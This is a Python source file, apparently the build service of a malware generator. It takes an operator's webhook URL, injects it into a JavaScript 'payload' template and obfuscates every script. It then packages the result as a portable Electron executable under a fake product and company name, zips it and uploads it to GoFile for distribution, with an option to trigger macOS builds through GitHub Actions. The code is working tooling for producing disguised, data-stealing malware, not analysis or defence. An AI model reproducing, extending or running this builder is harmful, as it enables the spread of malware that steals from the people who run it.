import os
import shutil
import time
import random
import re
import zipfile
import json
import subprocess
from pathlib import Path
from typing import Dict, Any, Optional

from config import BUILDS_DIR, PROJECT_ROOT
from .obfuscator_service import ObfuscatorService
from .gofile_service import GoFileService

class BuilderService:
    @staticmethod
    def generate_build_id() -> str:
        # Generates an id like 21829189 or timestamp + 4 digits
        return f"{int(time.time()) % 100000000:08d}{random.randint(10, 99)}"

    @classmethod
    def build(
        cls,
        webhook_url: str,
        target_os: str = "windows",
        filename: str = "payload",
        gofile_token: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Executes an isolated electron-builder build:
        1. Creates ./build/<build_id>/
        2. Copies project files (index.js, modules, package.json, package-lock.json)
        3. Updates config.js with webhook_url (replacing %WEBHOOK% or webhookUrl)
        4. Obfuscates index.js and all modules
        5. Configures package.json for target OS build
        6. Installs production dependencies inside isolated dir
        7. Runs electron-builder for the target OS
        8. Zips the resulting executable
        9. Uploads to GoFile
        10. Cleans up temporary directory
        """
        build_id = cls.generate_build_id()
        build_dir = BUILDS_DIR / build_id
        src_dir = build_dir / "src"

        # Validate target OS
        target_os = target_os.strip().lower()
        if target_os not in ["windows", "macos", "linux"]:
            return {
                "status": "error",
                "build_id": build_id,
                "message": f"Unsupported target OS: {target_os}. Choose windows, macos, or linux."
            }

        # Check if target is macos and we have GitHub integration configured
        if target_os == "macos":
            from config import GITHUB_TOKEN, GITHUB_OWNER, GITHUB_REPO
            if GITHUB_TOKEN and GITHUB_OWNER and GITHUB_REPO:
                return cls._trigger_github_build(
                    github_token=GITHUB_TOKEN,
                    owner=GITHUB_OWNER,
                    repo=GITHUB_REPO,
                    webhook=webhook_url,
                    filename=filename,
                    target_os="macos"
                )
            else:
                return {
                    "status": "error",
                    "build_id": build_id,
                    "message": "A compilação para macOS exige o GitHub Actions quando o builder é hospedado no Windows. "
                               "Por favor, configure GITHUB_TOKEN, GITHUB_OWNER e GITHUB_REPO no arquivo builder/config.py."
                }

        try:
            build_dir.mkdir(parents=True, exist_ok=True)
            src_dir.mkdir(parents=True, exist_ok=True)

            # 1. Copy necessary files to build isolation directory
            cls._copy_template_files(src_dir)

            # 2. Inject webhook into config.js and replace any %WEBHOOK% placeholders
            cls._inject_webhook(src_dir, webhook_url)

            # 3. Obfuscate all JavaScript files
            success, log_msg = ObfuscatorService.obfuscate_directory(src_dir)
            if not success:
                return {
                    "status": "error",
                    "build_id": build_id,
                    "message": f"Obfuscation failed: {log_msg}"
                }

            # 4. Configure package.json dynamically
            cls._configure_package_json(src_dir / "package.json", filename, target_os)

            # 5. Install production dependencies (exclude devDependencies like electron, electron-builder)
            cls._install_dependencies(src_dir)

            # 6. Run electron-builder
            cls._run_electron_builder(src_dir, target_os)

            # 7. Locate output executable/package
            dist_dir = src_dir / "dist"
            artifact_file = cls._find_build_artifact(dist_dir, target_os)
            if not artifact_file or not artifact_file.exists():
                return {
                    "status": "error",
                    "build_id": build_id,
                    "message": f"No compiled executable found in build output directory (dist/) for target OS {target_os}."
                }

            # 8. Normalize zip file name and create ZIP archive
            clean_filename = filename.strip() if filename else "konu_electron"
            if not clean_filename.lower().endswith(".zip"):
                clean_filename += ".zip"

            zip_path = build_dir / clean_filename
            if artifact_file.suffix.lower() == ".zip":
                shutil.copy2(artifact_file, zip_path)
            else:
                with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                    z.write(artifact_file, arcname=artifact_file.name)

            file_size_bytes = zip_path.stat().st_size

            # 9. Upload to GoFile
            upload_result = GoFileService.upload_file(zip_path, token=gofile_token)

            if upload_result.get("status") != "ok":
                return {
                    "status": "error",
                    "build_id": build_id,
                    "filename": clean_filename,
                    "zip_path": str(zip_path),
                    "message": f"Build succeeded but GoFile upload failed: {upload_result.get('message')}",
                    "gofile_raw": upload_result
                }

            gofile_data = upload_result.get("data", {})

            return {
                "status": "ok",
                "build_id": build_id,
                "os": target_os,
                "filename": clean_filename,
                "size_bytes": file_size_bytes,
                "download_url": gofile_data.get("downloadPage"),
                "direct_link": gofile_data.get("directLink"),
                "gofile_data": gofile_data,
                "build_path": str(build_dir)
            }

        except Exception as e:
            return {
                "status": "error",
                "build_id": build_id,
                "message": f"Build process encountered error: {str(e)}"
            }
        finally:
            # Clean up the large src/ folder (node_modules/ and build artifacts) to preserve space
            cls._remove_dir_with_retry(src_dir)

    @classmethod
    def _copy_template_files(cls, dest_dir: Path):
        """Copies template files into the isolated build directory."""
        # Copy index.js
        root_index = PROJECT_ROOT / "index.js"
        if root_index.exists():
            shutil.copy2(root_index, dest_dir / "index.js")

        # Copy package.json & package-lock.json
        for pkg_file in ["package.json", "package-lock.json"]:
            src_pkg = PROJECT_ROOT / pkg_file
            if src_pkg.exists():
                shutil.copy2(src_pkg, dest_dir / pkg_file)

        # Copy modules directory recursively
        modules_src = PROJECT_ROOT / "modules"
        modules_dest = dest_dir / "modules"
        if modules_src.exists():
            shutil.copytree(
                modules_src,
                modules_dest,
                ignore=shutil.ignore_patterns("__pycache__", "*.pyc", ".git", "node_modules")
            )

    @classmethod
    def _inject_webhook(cls, src_dir: Path, webhook_url: str):
        """
        Replaces %WEBHOOK% and updates config.js with the provided webhook URL.
        """
        # 1. Update modules/webhook/config.js specifically
        config_path = src_dir / "modules" / "webhook" / "config.js"
        if config_path.exists():
            content = config_path.read_text(encoding="utf-8")
            if "%WEBHOOK%" in content:
                content = content.replace("%WEBHOOK%", webhook_url)
            else:
                # Regex replace webhookUrl: "..."
                content = re.sub(
                    r'(webhookUrl\s*:\s*["\'])(.*?)(["\'])',
                    rf'\g<1>{webhook_url}\g<3>',
                    content
                )
            config_path.write_text(content, encoding="utf-8")

        # 2. Also scan all files in src_dir for %WEBHOOK% or %WEBHOOK_URL%
        for root, _, files in os.walk(src_dir):
            for file in files:
                if file.endswith((".js", ".json", ".txt")):
                    file_path = Path(root) / file
                    try:
                        text = file_path.read_text(encoding="utf-8")
                        if "%WEBHOOK%" in text or "%WEBHOOK_URL%" in text:
                            new_text = text.replace("%WEBHOOK%", webhook_url).replace("%WEBHOOK_URL%", webhook_url)
                            file_path.write_text(new_text, encoding="utf-8")
                    except Exception:
                        pass

    @classmethod
    def _configure_package_json(cls, package_path: Path, name: str, target_os: str):
        """Modifies package.json dynamically with custom build configurations for target OS."""
        if not package_path.exists():
            raise FileNotFoundError(f"package.json not found at {package_path}")

        with open(package_path, "r", encoding="utf-8") as f:
            pkg = json.load(f)

        # Sanitize name for package.json name field
        safe_name = "".join(c for c in name.lower() if c.isalnum() or c in "-_")
        if not safe_name:
            safe_name = "konu-app"

        pkg["name"] = safe_name
        pkg["productName"] = name
        pkg["version"] = pkg.get("version", "1.0.0")
        pkg["main"] = "index.js"
        pkg["description"] = f"{name} application"
        pkg["author"] = f"{name} Inc."

        # Get electron version from root package.json if possible to set a fixed version for electron-builder
        electron_version = "43.4.1"
        try:
            root_package_path = PROJECT_ROOT / "package.json"
            if root_package_path.exists():
                with open(root_package_path, "r", encoding="utf-8") as rf:
                    root_pkg = json.load(rf)
                    dev_deps = root_pkg.get("devDependencies", {})
                    deps = root_pkg.get("dependencies", {})
                    ev = dev_deps.get("electron") or deps.get("electron")
                    if ev:
                        # Strip ^, ~, or other non-numeric prefixes
                        electron_version = re.sub(r'^[^\d]+', '', ev)
        except Exception:
            pass

        # Configure electron-builder build settings
        pkg["build"] = {
            "appId": f"com.konu.{safe_name}",
            "productName": name,
            "electronVersion": electron_version,
            "npmRebuild": False,
            "directories": {
                "output": "dist"
            },
            "files": [
                "**/*",
                "!dist/**",
                "!node_modules/electron/**",
                "!node_modules/electron-builder/**"
            ]
        }

        if target_os == "windows":
            pkg["build"]["win"] = {
                "target": [
                    {
                        "target": "portable",
                        "arch": ["x64"]
                    }
                ]
            }
            pkg["build"]["portable"] = {
                "artifactName": f"{name}.exe",
                "requestExecutionLevel": "user"
            }
        elif target_os == "macos":
            pkg["build"]["mac"] = {
                "target": ["zip"],
                "category": "public.app-category.utilities"
            }
        elif target_os == "linux":
            pkg["build"]["linux"] = {
                "target": ["tar.gz"],
                "category": "Utility"
            }

        with open(package_path, "w", encoding="utf-8") as f:
            json.dump(pkg, f, indent=2, ensure_ascii=False)

    @classmethod
    def _install_dependencies(cls, src_dir: Path):
        """Installs production dependencies inside the isolated src folder."""
        # We run npm install --omit=dev using system shell to bypass execution policies automatically
        process = subprocess.run(
            "npm install --omit=dev",
            shell=True,
            cwd=str(src_dir),
            capture_output=True,
            text=True,
            check=False
        )
        if process.returncode != 0:
            error_msg = process.stderr.strip() or process.stdout.strip()
            raise RuntimeError(f"npm install failed: {error_msg}")

    @classmethod
    def _run_electron_builder(cls, src_dir: Path, target_os: str):
        """Runs the local electron-builder executable to package the application."""
        electron_builder_cli = PROJECT_ROOT / "node_modules" / "electron-builder" / "cli.js"
        if not electron_builder_cli.exists():
            raise FileNotFoundError(f"electron-builder CLI not found at {electron_builder_cli}")

        os_flag_map = {
            "windows": "win",
            "macos": "mac",
            "linux": "linux"
        }
        os_flag = os_flag_map.get(target_os, "win")

        # Command to run electron-builder using direct node execution to bypass execution policies
        cmd = f'node "{electron_builder_cli}" --{os_flag} --x64'
        process = subprocess.run(
            cmd,
            shell=True,
            cwd=str(src_dir),
            capture_output=True,
            text=True,
            check=False
        )
        if process.returncode != 0:
            error_msg = process.stderr.strip() or process.stdout.strip()
            raise RuntimeError(f"electron-builder failed: {error_msg}")

    @classmethod
    def _find_build_artifact(cls, dist_dir: Path, target_os: str) -> Optional[Path]:
        """Locates the built executable/archive in the dist/ folder based on target OS."""
        if not dist_dir.exists():
            return None

        if target_os == "windows":
            # Portable Windows executable ends with .exe
            for f in dist_dir.glob("*.exe"):
                return f
        elif target_os == "macos":
            # macOS portable zip target ends with .zip (or sometimes dmg)
            for f in dist_dir.glob("*.zip"):
                return f
            for f in dist_dir.glob("*.dmg"):
                return f
        elif target_os == "linux":
            # Linux portable target ends with .AppImage or .tar.gz
            for f in dist_dir.glob("*.AppImage"):
                return f
            for f in dist_dir.glob("*.tar.gz"):
                return f

        # Fallback to returning the first file in the directory
        for f in dist_dir.iterdir():
            if f.is_file() and not f.name.endswith(".yaml"):
                return f
        return None

    @classmethod
    def _remove_dir_with_retry(cls, path: Path, max_attempts: int = 5):
        """Recursively removes a directory with retries."""
        if not path.exists():
            return True
        for attempt in range(max_attempts):
            try:
                shutil.rmtree(path, ignore_errors=True)
                if not path.exists():
                    return True
            except Exception:
                pass
            time.sleep(0.5 * (attempt + 1))
        return not path.exists()

    @classmethod
    def _trigger_github_build(
        cls,
        github_token: str,
        owner: str,
        repo: str,
        webhook: str,
        filename: str,
        target_os: str
    ) -> Dict[str, Any]:
        """Triggers a manual workflow execution (workflow_dispatch) via the GitHub Actions API."""
        import requests
        url = f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/build.yml/dispatches"
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28"
        }
        data = {
            "ref": "main",
            "inputs": {
                "webhook": webhook,
                "filename": filename,
                "target_os": target_os
            }
        }
        try:
            response = requests.post(url, headers=headers, json=data, timeout=30)
            if response.status_code == 204:
                return {
                    "status": "ok",
                    "platform": "github_actions",
                    "target_os": target_os,
                    "message": f"Compilação para {target_os} iniciada com sucesso no GitHub Actions! O link do download será enviado para o seu Webhook assim que concluído."
                }
            else:
                return {
                    "status": "error",
                    "message": f"Erro ao acionar a API do GitHub (Status {response.status_code}): {response.text}"
                }
        except Exception as e:
            return {
                "status": "error",
                "message": f"Exceção durante disparo da API do GitHub: {str(e)}"
            }
